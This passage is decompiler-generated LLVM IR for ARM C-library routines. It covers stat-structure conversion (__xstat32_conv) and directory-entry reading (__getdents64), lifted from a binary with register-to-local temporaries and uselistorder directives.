  store i32 %v2_14c0c, i32* %r3.global-to-local, align 4
  %v3_14c0c = add i32 %v0_14c08, 100
  %v4_14c0c = inttoptr i32 %v3_14c0c to i32*
  %v5_14c0c = load i32, i32* %v4_14c0c, align 4
  store i32 %v5_14c0c, i32* %r4.global-to-local, align 4
  %v1_14c10 = add i32 %v0_14c08, 56
  %v2_14c10 = inttoptr i32 %v1_14c10 to i32*
  %v3_14c10 = load i32, i32* %v2_14c10, align 4
  store i32 %v3_14c10, i32* %r2.global-to-local, align 4
  %v1_14c14 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c14 = add i32 %v1_14c14, 96
  %v3_14c14 = inttoptr i32 %v2_14c14 to i32*
  store i32 %v2_14c0c, i32* %v3_14c14, align 4
  %v0_14c18 = load i32, i32* %r4.global-to-local, align 4
  %v1_14c18 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c18 = add i32 %v1_14c18, 100
  %v3_14c18 = inttoptr i32 %v2_14c18 to i32*
  store i32 %v0_14c18, i32* %v3_14c18, align 4
  %v0_14c1c = load i32, i32* %r6.global-to-local, align 4
  %v1_14c1c = add i32 %v0_14c1c, 24
  store i32 %v1_14c1c, i32* %ip.global-to-local, align 4
  %v1_14c20 = inttoptr i32 %v1_14c1c to i32*
  %v2_14c20 = load i32, i32* %v1_14c20, align 4
  store i32 %v2_14c20, i32* %ip.global-to-local, align 4
  %v3_14c20 = add i32 %v0_14c1c, 28
  %v4_14c20 = inttoptr i32 %v3_14c20 to i32*
  %v5_14c20 = load i32, i32* %v4_14c20, align 4
  store i32 %v5_14c20, i32* %lr.global-to-local, align 4
  %v0_14c24 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c24 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c24 = add i32 %v1_14c24, 56
  %v3_14c24 = inttoptr i32 %v2_14c24 to i32*
  store i32 %v0_14c24, i32* %v3_14c24, align 4
  %v0_14c28 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c28 = add i32 %v0_14c28, 72
  store i32 %v1_14c28, i32* %r3.global-to-local, align 4
  %v1_14c2c = add i32 %v0_14c28, 32
  store i32 %v1_14c2c, i32* %r7.global-to-local, align 4
  %v1_14c30 = inttoptr i32 %v1_14c2c to i32*
  %v2_14c30 = load i32, i32* %v1_14c30, align 4
  store i32 %v2_14c30, i32* %r7.global-to-local, align 4
  %v3_14c30 = add i32 %v0_14c28, 36
  %v4_14c30 = inttoptr i32 %v3_14c30 to i32*
  %v5_14c30 = load i32, i32* %v4_14c30, align 4
  store i32 %v5_14c30, i32* %r8.global-to-local, align 4
  %v1_14c34 = inttoptr i32 %v1_14c28 to i32*
  %v2_14c34 = load i32, i32* %v1_14c34, align 4
  %v3_14c34 = add i32 %v0_14c28, 76
  %v4_14c34 = inttoptr i32 %v3_14c34 to i32*
  %v5_14c34 = load i32, i32* %v4_14c34, align 4
  store i32 %v5_14c34, i32* %r1.global-to-local, align 4
  %v0_14c38 = load i32, i32* %r5.global-to-local, align 4
  %v1_14c38 = add i32 %v0_14c38, 72
  %v1_14c3c = inttoptr i32 %v1_14c38 to i32*
  store i32 %v2_14c34, i32* %v1_14c3c, align 4
  %v3_14c3c = add i32 %v0_14c38, 76
  %v4_14c3c = inttoptr i32 %v3_14c3c to i32*
  %v5_14c3c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14c3c, i32* %v4_14c3c, align 4
  %v0_14c40 = load i32, i32* %r7.global-to-local, align 4
  %v1_14c40 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c40 = add i32 %v1_14c40, 32
  %v3_14c40 = inttoptr i32 %v2_14c40 to i32*
  store i32 %v0_14c40, i32* %v3_14c40, align 4
  %v0_14c44 = load i32, i32* %r8.global-to-local, align 4
  %v1_14c44 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c44 = add i32 %v1_14c44, 36
  %v3_14c44 = inttoptr i32 %v2_14c44 to i32*
  store i32 %v0_14c44, i32* %v3_14c44, align 4
  %v0_14c48 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c48 = add i32 %v0_14c48, 80
  store i32 %v1_14c48, i32* %r3.global-to-local, align 4
  %v1_14c4c = add i32 %v0_14c48, 48
  store i32 %v1_14c4c, i32* %r7.global-to-local, align 4
  %v1_14c50 = inttoptr i32 %v1_14c4c to i32*
  %v2_14c50 = load i32, i32* %v1_14c50, align 4
  store i32 %v2_14c50, i32* %r7.global-to-local, align 4
  %v3_14c50 = add i32 %v0_14c48, 52
  %v4_14c50 = inttoptr i32 %v3_14c50 to i32*
  %v5_14c50 = load i32, i32* %v4_14c50, align 4
  store i32 %v5_14c50, i32* %r8.global-to-local, align 4
  %v1_14c54 = inttoptr i32 %v1_14c48 to i32*
  %v2_14c54 = load i32, i32* %v1_14c54, align 4
  %v3_14c54 = add i32 %v0_14c48, 84
  %v4_14c54 = inttoptr i32 %v3_14c54 to i32*
  %v5_14c54 = load i32, i32* %v4_14c54, align 4
  store i32 %v5_14c54, i32* %r1.global-to-local, align 4
  %v1_14c58 = add i32 %v0_14c48, 16
  %v2_14c58 = inttoptr i32 %v1_14c58 to i32*
  %v3_14c58 = load i32, i32* %v2_14c58, align 4
  store i32 %v3_14c58, i32* %r2.global-to-local, align 4
  %v0_14c5c = load i32, i32* %r5.global-to-local, align 4
  %v1_14c5c = add i32 %v0_14c5c, 80
  %v1_14c60 = inttoptr i32 %v1_14c5c to i32*
  store i32 %v2_14c54, i32* %v1_14c60, align 4
  %v3_14c60 = add i32 %v0_14c5c, 84
  %v4_14c60 = inttoptr i32 %v3_14c60 to i32*
  %v5_14c60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14c60, i32* %v4_14c60, align 4
  %v0_14c64 = load i32, i32* %r7.global-to-local, align 4
  %v1_14c64 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c64 = add i32 %v1_14c64, 48
  %v3_14c64 = inttoptr i32 %v2_14c64 to i32*
  store i32 %v0_14c64, i32* %v3_14c64, align 4
  %v0_14c68 = load i32, i32* %r8.global-to-local, align 4
  %v1_14c68 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c68 = add i32 %v1_14c68, 52
  %v3_14c68 = inttoptr i32 %v2_14c68 to i32*
  store i32 %v0_14c68, i32* %v3_14c68, align 4
  %v0_14c6c = load i32, i32* %r2.global-to-local, align 4
  %v1_14c6c = load i32, i32* %r5.global-to-local, align 4
  %v2_14c6c = add i32 %v1_14c6c, 16
  %v3_14c6c = inttoptr i32 %v2_14c6c to i32*
  store i32 %v0_14c6c, i32* %v3_14c6c, align 4
  %v0_14c70 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c70 = add i32 %v0_14c70, 88
  store i32 %v1_14c70, i32* %r3.global-to-local, align 4
  %v1_14c74 = add i32 %v0_14c70, 20
  %v2_14c74 = inttoptr i32 %v1_14c74 to i32*
  %v3_14c74 = load i32, i32* %v2_14c74, align 4
  store i32 %v3_14c74, i32* %r2.global-to-local, align 4
  %v1_14c78 = inttoptr i32 %v1_14c70 to i32*
  %v2_14c78 = load i32, i32* %v1_14c78, align 4
  %v3_14c78 = add i32 %v0_14c70, 92
  %v4_14c78 = inttoptr i32 %v3_14c78 to i32*
  %v5_14c78 = load i32, i32* %v4_14c78, align 4
  store i32 %v5_14c78, i32* %r1.global-to-local, align 4
  %v1_14c7c = add i32 %v0_14c70, 64
  store i32 %v1_14c7c, i32* %r6.global-to-local, align 4
  %v1_14c80 = inttoptr i32 %v1_14c7c to i32*
  %v2_14c80 = load i32, i32* %v1_14c80, align 4
  store i32 %v2_14c80, i32* %r6.global-to-local, align 4
  %v3_14c80 = add i32 %v0_14c70, 68
  %v4_14c80 = inttoptr i32 %v3_14c80 to i32*
  %v5_14c80 = load i32, i32* %v4_14c80, align 4
  store i32 %v5_14c80, i32* %r7.global-to-local, align 4
  %v0_14c84 = load i32, i32* %r5.global-to-local, align 4
  %v1_14c84 = add i32 %v0_14c84, 88
  store i32 %v1_14c84, i32* %r3.global-to-local, align 4
  %v2_14c88 = add i32 %v0_14c84, 20
  %v3_14c88 = inttoptr i32 %v2_14c88 to i32*
  store i32 %v3_14c74, i32* %v3_14c88, align 4
  %v0_14c8c = load i32, i32* %ip.global-to-local, align 4
  %v1_14c8c = load i32, i32* %r5.global-to-local, align 4
  %v2_14c8c = add i32 %v1_14c8c, 24
  %v3_14c8c = inttoptr i32 %v2_14c8c to i32*
  store i32 %v0_14c8c, i32* %v3_14c8c, align 4
  %v0_14c90 = load i32, i32* %lr.global-to-local, align 4
  %v1_14c90 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c90 = add i32 %v1_14c90, 28
  %v3_14c90 = inttoptr i32 %v2_14c90 to i32*
  store i32 %v0_14c90, i32* %v3_14c90, align 4
  %v0_14c94 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c94 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c94 = add i32 %v1_14c94, 64
  %v3_14c94 = inttoptr i32 %v2_14c94 to i32*
  store i32 %v0_14c94, i32* %v3_14c94, align 4
  %v0_14c98 = load i32, i32* %r7.global-to-local, align 4
  %v1_14c98 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c98 = add i32 %v1_14c98, 68
  %v3_14c98 = inttoptr i32 %v2_14c98 to i32*
  store i32 %v0_14c98, i32* %v3_14c98, align 4
  %v0_14c9c = load i32, i32* %r3.global-to-local, align 4
  %v1_14c9c = inttoptr i32 %v0_14c9c to i32*
  store i32 %v2_14c78, i32* %v1_14c9c, align 4
  %v3_14c9c = add i32 %v0_14c9c, 4
  %v4_14c9c = inttoptr i32 %v3_14c9c to i32*
  %v5_14c9c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14c9c, i32* %v4_14c9c, align 4
  %v2_14ca0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14ca0, i32* %r4.global-to-local, align 4
  ret i32 %v2_14c78

; uselistorder directives
  uselistorder i32 %v0_14c70, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_14c48, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 104, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_14ca8 = load i32, i32* @r4, align 4
  store i32 %v3_14ca8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_14cc0 = inttoptr i32 %arg2 to i8*
  %v4_14cc0 = call i32 @__GI_memset(i8* %v3_14cc0, i32 0, i32 88)
  %v2_14cc4 = load i32, i32* %arg1, align 4
  %v3_14cc4 = add i32 %tmp, 4
  %v4_14cc4 = inttoptr i32 %v3_14cc4 to i32*
  %v5_14cc4 = load i32, i32* %v4_14cc4, align 4
  store i32 %v5_14cc4, i32* %r4.global-to-local, align 4
  %v0_14cc8 = load i32, i32* %r6.global-to-local, align 4
  %v1_14cc8 = inttoptr i32 %v0_14cc8 to i32*
  store i32 %v2_14cc4, i32* %v1_14cc8, align 4
  %v3_14cc8 = add i32 %v0_14cc8, 4
  %v4_14cc8 = inttoptr i32 %v3_14cc8 to i32*
  %v5_14cc8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14cc8, i32* %v4_14cc8, align 4
  %v0_14ccc = load i32, i32* %r5.global-to-local, align 4
  %v1_14ccc = add i32 %v0_14ccc, 32
  %v1_14cd0 = inttoptr i32 %v1_14ccc to i32*
  %v2_14cd0 = load i32, i32* %v1_14cd0, align 4
  %v3_14cd0 = add i32 %v0_14ccc, 36
  %v4_14cd0 = inttoptr i32 %v3_14cd0 to i32*
  %v5_14cd0 = load i32, i32* %v4_14cd0, align 4
  store i32 %v5_14cd0, i32* %r4.global-to-local, align 4
  %v1_14cd4 = add i32 %v0_14ccc, 96
  %v2_14cd4 = inttoptr i32 %v1_14cd4 to i32*
  %v3_14cd4 = load i32, i32* %v2_14cd4, align 4
  store i32 %v3_14cd4, i32* %r2.global-to-local, align 4
  %v1_14cd8 = load i32, i32* %r6.global-to-local, align 4
  %v2_14cd8 = add i32 %v1_14cd8, 32
  %v3_14cd8 = inttoptr i32 %v2_14cd8 to i32*
  store i32 %v2_14cd0, i32* %v3_14cd8, align 4
  %v0_14cdc = load i32, i32* %r4.global-to-local, align 4
  %v1_14cdc = load i32, i32* %r6.global-to-local, align 4
  %v2_14cdc = add i32 %v1_14cdc, 36
  %v3_14cdc = inttoptr i32 %v2_14cdc to i32*
  store i32 %v0_14cdc, i32* %v3_14cdc, align 4
  %v0_14ce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ce0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14ce0 = add i32 %v1_14ce0, 12
  %v3_14ce0 = inttoptr i32 %v2_14ce0 to i32*
  store i32 %v0_14ce0, i32* %v3_14ce0, align 4
  %v0_14ce4 = load i32, i32* %r5.global-to-local, align 4
  %v1_14ce4 = add i32 %v0_14ce4, 48
  %v2_14ce4 = inttoptr i32 %v1_14ce4 to i32*
  %v3_14ce4 = load i32, i32* %v2_14ce4, align 4
  %v1_14ce8 = add i32 %v0_14ce4, 24
  store i32 %v1_14ce8, i32* %ip.global-to-local, align 4
  %v1_14cec = inttoptr i32 %v1_14ce8 to i32*
  %v2_14cec = load i32, i32* %v1_14cec, align 4
  store i32 %v2_14cec, i32* %ip.global-to-local, align 4
  %v3_14cec = add i32 %v0_14ce4, 28
  %v4_14cec = inttoptr i32 %v3_14cec to i32*
  %v5_14cec = load i32, i32* %v4_14cec, align 4
  store i32 %v5_14cec, i32* %lr.global-to-local, align 4
  %v1_14cf0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14cf0 = add i32 %v1_14cf0, 44
  %v3_14cf0 = inttoptr i32 %v2_14cf0 to i32*
  store i32 %v3_14ce4, i32* %v3_14cf0, align 4
  %v0_14cf4 = load i32, i32* %r5.global-to-local, align 4
  %v1_14cf4 = add i32 %v0_14cf4, 64
  %v2_14cf4 = inttoptr i32 %v1_14cf4 to i32*
  %v3_14cf4 = load i32, i32* %v2_14cf4, align 4
  %v1_14cf8 = add i32 %v0_14cf4, 56
  %v2_14cf8 = inttoptr i32 %v1_14cf8 to i32*
  %v3_14cf8 = load i32, i32* %v2_14cf8, align 4
  store i32 %v3_14cf8, i32* %r2.global-to-local, align 4
  %v1_14cfc = load i32, i32* %r6.global-to-local, align 4
  %v2_14cfc = add i32 %v1_14cfc, 52
  %v3_14cfc = inttoptr i32 %v2_14cfc to i32*
  store i32 %v3_14cf4, i32* %v3_14cfc, align 4
  %v0_14d00 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d00 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d00 = add i32 %v1_14d00, 48
  %v3_14d00 = inttoptr i32 %v2_14d00 to i32*
  store i32 %v0_14d00, i32* %v3_14d00, align 4
  %v0_14d04 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d04 = add i32 %v0_14d04, 72
  %v1_14d08 = inttoptr i32 %v1_14d04 to i32*
  %v2_14d08 = load i32, i32* %v1_14d08, align 4
  %v3_14d08 = add i32 %v0_14d04, 76
  %v4_14d08 = inttoptr i32 %v3_14d08 to i32*
  %v5_14d08 = load i32, i32* %v4_14d08, align 4
  store i32 %v5_14d08, i32* %r1.global-to-local, align 4
  %v0_14d0c = load i32, i32* %r6.global-to-local, align 4
  %v1_14d0c = add i32 %v0_14d0c, 56
  %v1_14d10 = inttoptr i32 %v1_14d0c to i32*
  store i32 %v2_14d08, i32* %v1_14d10, align 4
  %v3_14d10 = add i32 %v0_14d0c, 60
  %v4_14d10 = inttoptr i32 %v3_14d10 to i32*
  %v5_14d10 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14d10, i32* %v4_14d10, align 4
  %v0_14d14 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d14 = add i32 %v0_14d14, 80
  %v1_14d18 = inttoptr i32 %v1_14d14 to i32*
  %v2_14d18 = load i32, i32* %v1_14d18, align 4
  %v3_14d18 = add i32 %v0_14d14, 84
  %v4_14d18 = inttoptr i32 %v3_14d18 to i32*
  %v5_14d18 = load i32, i32* %v4_14d18, align 4
  store i32 %v5_14d18, i32* %r1.global-to-local, align 4
  %v0_14d1c = load i32, i32* %r6.global-to-local, align 4
  %v1_14d1c = add i32 %v0_14d1c, 64
  %v1_14d20 = inttoptr i32 %v1_14d1c to i32*
  store i32 %v2_14d18, i32* %v1_14d20, align 4
  %v3_14d20 = add i32 %v0_14d1c, 68
  %v4_14d20 = inttoptr i32 %v3_14d20 to i32*
  %v5_14d20 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14d20, i32* %v4_14d20, align 4
  %v0_14d24 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d24 = add i32 %v0_14d24, 16
  %v2_14d24 = inttoptr i32 %v1_14d24 to i32*
  %v3_14d24 = load i32, i32* %v2_14d24, align 4
  %v1_14d28 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d28 = add i32 %v1_14d28, 16
  %v3_14d28 = inttoptr i32 %v2_14d28 to i32*
  store i32 %v3_14d24, i32* %v3_14d28, align 4
  %v0_14d2c = load i32, i32* %r5.global-to-local, align 4
  %v1_14d2c = add i32 %v0_14d2c, 88
  %v1_14d30 = add i32 %v0_14d2c, 20
  %v2_14d30 = inttoptr i32 %v1_14d30 to i32*
  %v3_14d30 = load i32, i32* %v2_14d30, align 4
  store i32 %v3_14d30, i32* %r2.global-to-local, align 4
  %v1_14d34 = inttoptr i32 %v1_14d2c to i32*
  %v2_14d34 = load i32, i32* %v1_14d34, align 4
  %v3_14d34 = add i32 %v0_14d2c, 92
  %v4_14d34 = inttoptr i32 %v3_14d34 to i32*
  %v5_14d34 = load i32, i32* %v4_14d34, align 4
  store i32 %v5_14d34, i32* %r1.global-to-local, align 4
  %v0_14d38 = load i32, i32* %r6.global-to-local, align 4
  %v1_14d38 = add i32 %v0_14d38, 72
  %v1_14d3c = inttoptr i32 %v1_14d38 to i32*
  store i32 %v2_14d34, i32* %v1_14d3c, align 4
  %v3_14d3c = add i32 %v0_14d38, 76
  %v4_14d3c = inttoptr i32 %v3_14d3c to i32*
  %v5_14d3c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14d3c, i32* %v4_14d3c, align 4
  %v0_14d40 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d40 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d40 = add i32 %v1_14d40, 20
  %v3_14d40 = inttoptr i32 %v2_14d40 to i32*
  store i32 %v0_14d40, i32* %v3_14d40, align 4
  %v0_14d44 = load i32, i32* %ip.global-to-local, align 4
  %v1_14d44 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d44 = add i32 %v1_14d44, 24
  %v3_14d44 = inttoptr i32 %v2_14d44 to i32*
  store i32 %v0_14d44, i32* %v3_14d44, align 4
  %v0_14d48 = load i32, i32* %lr.global-to-local, align 4
  %v1_14d48 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d48 = add i32 %v1_14d48, 28
  %v3_14d48 = inttoptr i32 %v2_14d48 to i32*
  store i32 %v0_14d48, i32* %v3_14d48, align 4
  %v2_14d4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d4c, i32* %r4.global-to-local, align 4
  ret i32 %v2_14d34

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 3, 4, 0, 1, 5, 6, 8, 7, 9, 2, 10, 11, 12, 14, 13, 15, 16, 17 }
  uselistorder i32 96, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_14d58 = load i32, i32* @r5, align 4
  %v12_14d58 = load i32, i32* @r7, align 4
  %v1_14d5c = add i32 %arg3, 14
  %v2_14d64 = ptrtoint i32* %stack_var_-72 to i32
  %v1_14d68 = and i32 %v1_14d5c, -8
  %v2_14d6c = sub i32 %v2_14d64, %v1_14d68
  %v1_14d70 = add i32 %v2_14d6c, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_14db4, label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %entry
  %v1_14d9c = sub i32 0, %arg1
  %v3_14da0 = load i16, i16* @global_var_23164.175, align 2
  %v4_14da0 = sext i16 %v3_14da0 to i32
  %v0_14da4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14dac = add i32 %v4_14da0, %v0_14da4
  %v4_14dac = inttoptr i32 %v3_14dac to i32*
  store i32 %v1_14d9c, i32* %v4_14dac, align 4
  br label %dec_label_pc_14e84

dec_label_pc_14db4:                               ; preds = %entry
  br i1 false, label %dec_label_pc_14e84, label %dec_label_pc_14dbc

dec_label_pc_14dbc:                               ; preds = %dec_label_pc_14db4
  %v2_14dbc = add i32 %v1_14d70, %arg1
  store i32 %v2_14dbc, i32* %r1.global-to-local, align 4
  %v2_14dc0 = add i32 %tmp, %arg3
  store i32 %v1_14d70, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_14e6c

dec_label_pc_14ddc:                               ; preds = %dec_label_pc_14e6c
  %v1_14ddc = add i32 %v0_14e3c, 16
  %v2_14ddc = inttoptr i32 %v1_14ddc to i16*
  %v3_14ddc = load i16, i16* %v2_14ddc, align 2
  %v4_14ddc = zext i16 %v3_14ddc to i32
  %v1_14de0 = add nsw i32 %v4_14ddc, -19
  store i32 %v1_14de0, i32* @r2, align 4
  %v1_14de4 = add nuw nsw i32 %v4_14ddc, 7
  %v1_14de8 = and i32 %v1_14de4, 131064
  store i32 %v1_14de8, i32* @ip, align 4
  %v2_14df0 = add i32 %v1_14de8, %v0_14e44
  store i32 %v2_14df0, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_14df0, %v2_14dc0
  br i1 %tmp24, label %dec_label_pc_14dfc, label %dec_label_pc_14e38

dec_label_pc_14dfc:                               ; preds = %dec_label_pc_14ddc
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_14e04 = load i32, i32* %r8.global-to-local, align 4
  %v0_14e08 = load i32, i32* %sb.global-to-local, align 4
  %v1_14e0c = load i32, i32* @sp, align 4
  %v2_14e0c = inttoptr i32 %v1_14e0c to i32*
  store i32 0, i32* %v2_14e0c, align 4
  %v4_14e10 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_14e04, i32 %v0_14e08)
  %v0_14e14 = load i32, i32* @r5, align 4
  %v1_14e14 = load i32, i32* %sl.global-to-local, align 4
  %v9_14e14 = icmp eq i32 %v0_14e14, %v1_14e14
  br i1 %v9_14e14, label %dec_label_pc_14e1c, label %dec_label_pc_14e80

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14dfc
  %v0_14e20 = call i32 @__aeabi_read_tp()
  %v3_14e24 = load i16, i16* @global_var_23164.175, align 2
  %v4_14e24 = sext i16 %v3_14e24 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14e30 = add i32 %v4_14e24, %v0_14e20
  %v4_14e30 = inttoptr i32 %v3_14e30 to i32*
  store i32 22, i32* %v4_14e30, align 4
  br label %dec_label_pc_14e84

dec_label_pc_14e38:                               ; preds = %dec_label_pc_14ddc
  %v1_14e38 = inttoptr i32 %v0_14e3c to i32*
  %v2_14e38 = load i32, i32* %v1_14e38, align 4
  %v3_14e38 = add i32 %v0_14e3c, 4
  %v4_14e38 = inttoptr i32 %v3_14e38 to i32*
  %v5_14e38 = load i32, i32* %v4_14e38, align 4
  store i32 %v5_14e38, i32* @r4, align 4
  %v1_14e3c = add i32 %v0_14e3c, 8
  store i32 %v1_14e3c, i32* %r8.global-to-local, align 4
  %v1_14e40 = inttoptr i32 %v1_14e3c to i32*
  %v2_14e40 = load i32, i32* %v1_14e40, align 4
  store i32 %v2_14e40, i32* %r8.global-to-local, align 4
  %v3_14e40 = add i32 %v0_14e3c, 12
  %v4_14e40 = inttoptr i32 %v3_14e40 to i32*
  %v5_14e40 = load i32, i32* %v4_14e40, align 4
  store i32 %v5_14e40, i32* %sb.global-to-local, align 4
  %v1_14e44 = inttoptr i32 %v0_14e44 to i32*
  store i32 %v2_14e38, i32* %v1_14e44, align 4
  %v3_14e44 = add i32 %v0_14e44, 4
  %v4_14e44 = inttoptr i32 %v3_14e44 to i32*
  %v5_14e44 = load i32, i32* @r4, align 4
  store i32 %v5_14e44, i32* %v4_14e44, align 4
  %v0_14e48 = load i32, i32* %r8.global-to-local, align 4
  %v1_14e48 = load i32, i32* @r5, align 4
  %v2_14e48 = add i32 %v1_14e48, 8
  %v3_14e48 = inttoptr i32 %v2_14e48 to i32*
  store i32 %v0_14e48, i32* %v3_14e48, align 4
  %v0_14e4c = load i32, i32* %sb.global-to-local, align 4
  %v1_14e4c = load i32, i32* @r5, align 4
  %v2_14e4c = add i32 %v1_14e4c, 12
  %v3_14e4c = inttoptr i32 %v2_14e4c to i32*
  store i32 %v0_14e4c, i32* %v3_14e4c, align 4
  %v0_14e50 = load i32, i32* @ip, align 4
  %v1_14e50 = trunc i32 %v0_14e50 to i16
  %v2_14e50 = load i32, i32* @r5, align 4
  %v3_14e50 = add i32 %v2_14e50, 16
  %v4_14e50 = inttoptr i32 %v3_14e50 to i16*
  store i16 %v1_14e50, i16* %v4_14e50, align 2
  %v0_14e54 = load i32, i32* @r7, align 4
  %v1_14e54 = add i32 %v0_14e54, 18
  %v2_14e54 = inttoptr i32 %v1_14e54 to i8*
  %v3_14e54 = load i8, i8* %v2_14e54, align 1
  %v4_14e54 = zext i8 %v3_14e54 to i32
  store i32 %v4_14e54, i32* @r3, align 4
  %v2_14e58 = load i32, i32* @r5, align 4
  %v3_14e58 = add i32 %v2_14e58, 18
  %v4_14e58 = inttoptr i32 %v3_14e58 to i8*
  store i8 %v3_14e54, i8* %v4_14e58, align 1
  %v0_14e5c = call i32 @memcpy()
  %v0_14e60 = load i32, i32* @r7, align 4
  %v1_14e60 = add i32 %v0_14e60, 16
  %v2_14e60 = inttoptr i32 %v1_14e60 to i16*
  %v3_14e60 = load i16, i16* %v2_14e60, align 2
  %v4_14e60 = zext i16 %v3_14e60 to i32
  %v0_14e64 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_14e64, i32* @r5, align 4
  %v2_14e68 = add i32 %v4_14e60, %v0_14e60
  store i32 %v2_14e68, i32* @r7, align 4
  br label %dec_label_pc_14e6c

dec_label_pc_14e6c:                               ; preds = %dec_label_pc_14dbc, %dec_label_pc_14e38
  %v0_14e44 = phi i32 [ %tmp, %dec_label_pc_14dbc ], [ %v0_14e64, %dec_label_pc_14e38 ]
  %v0_14e3c = phi i32 [ %v1_14d70, %dec_label_pc_14dbc ], [ %v2_14e68, %dec_label_pc_14e38 ]
  %v3_14e70 = icmp ult i32 %v0_14e3c, %v2_14dbc
  %v1_14e74 = add i32 %v0_14e44, 19
  store i32 %v1_14e74, i32* @r0, align 4
  %v1_14e78 = add i32 %v0_14e3c, 19
  store i32 %v1_14e78, i32* @r1, align 4
  br i1 %v3_14e70, label %dec_label_pc_14ddc, label %dec_label_pc_14e80.loopexit

dec_label_pc_14e80.loopexit:                      ; preds = %dec_label_pc_14e6c
  %v0_14e80.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_14e80

dec_label_pc_14e80:                               ; preds = %dec_label_pc_14e80.loopexit, %dec_label_pc_14dfc
  %v1_14e80 = phi i32 [ %v0_14e44, %dec_label_pc_14e80.loopexit ], [ %v0_14e14, %dec_label_pc_14dfc ]
  %v0_14e80 = phi i32 [ %v0_14e80.pre, %dec_label_pc_14e80.loopexit ], [ %v1_14e14, %dec_label_pc_14dfc ]
  %v2_14e80 = sub i32 %v1_14e80, %v0_14e80
  store i32 %v2_14e80, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14e84

dec_label_pc_14e84:                               ; preds = %dec_label_pc_14db4, %dec_label_pc_14e1c, %dec_label_pc_14d98, %dec_label_pc_14e80
  %v0_14e84 = load i32, i32* %r1.global-to-local, align 4
